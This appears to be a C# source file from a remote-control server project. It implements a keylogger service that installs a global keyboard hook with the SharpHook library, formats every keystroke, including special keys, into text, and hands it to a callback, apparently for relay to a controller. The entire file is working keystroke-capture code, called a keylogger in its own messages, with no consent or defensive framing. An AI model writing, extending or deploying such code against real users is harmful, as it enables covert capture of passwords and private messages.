using System;
using System.Threading.Tasks;
using SharpHook;
using SharpHook.Native;

namespace Server.Services
{
    public class InputService : IDisposable
    {
        private TaskPoolGlobalHook _hook;
        private bool _isRunning = false;
        private Action<string> _onKeyDataReceived;

        public InputService()
        {
            _hook = new TaskPoolGlobalHook();

            _hook.KeyPressed += OnKeyPressed;
        }
        public void StartKeyLogger(Action<string> callback)
        {
            if (_isRunning) return;

            _onKeyDataReceived = callback;
            _isRunning = true;

            Task.Run(() => 
            {
                try
                {
                    Console.WriteLine("Keylogger started.");
                    _hook.Run(); // Lệnh này sẽ chạy vòng lặp chặn (blocking loop) cho đến khi Dispose
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Keylogger error: {ex.Message}");
                }
            });
        }
        public void StopKeyLogger()
        {
            if (!_isRunning) return;

            
            _isRunning = false;
            if (_hook.IsRunning)
            {
                _onKeyDataReceived = null;
                Console.WriteLine("Keylogger stopped (callback removed).");
                
                _hook.Dispose();
                _hook = new TaskPoolGlobalHook();
                _hook.KeyPressed += OnKeyPressed;
            }
        }


        private void OnKeyPressed(object sender, KeyboardHookEventArgs e)
        {
            if (!_isRunning || _onKeyDataReceived == null) return;

            var keyData = FormatKey(e.Data);

            _onKeyDataReceived?.Invoke(keyData);
        }

        private string FormatKey(KeyboardEventData data)
        {
            switch (data.KeyCode)
            {
                case KeyCode.VcEnter: return "\n"; 
                case KeyCode.VcSpace: return " ";  
                case KeyCode.VcBackspace: return "[BACKSPACE]";
                case KeyCode.VcTab: return "[TAB]";
                case KeyCode.VcLeftShift:
                case KeyCode.VcRightShift: return ""; 
                case KeyCode.VcLeftControl:
                case KeyCode.VcRightControl: return "[CTRL]";
                case KeyCode.VcLeftAlt:
                case KeyCode.VcRightAlt: return "[ALT]";
                case KeyCode.VcEscape: return "[ESC]";
                // ... Thêm các phím khác nếu cần
                
                default:
                   
                    return data.KeyChar != 0 ? data.KeyChar.ToString() : $"[{data.KeyCode}]";
            }
        }

        public void Dispose()
        {
            _hook?.Dispose();
        }
    }
}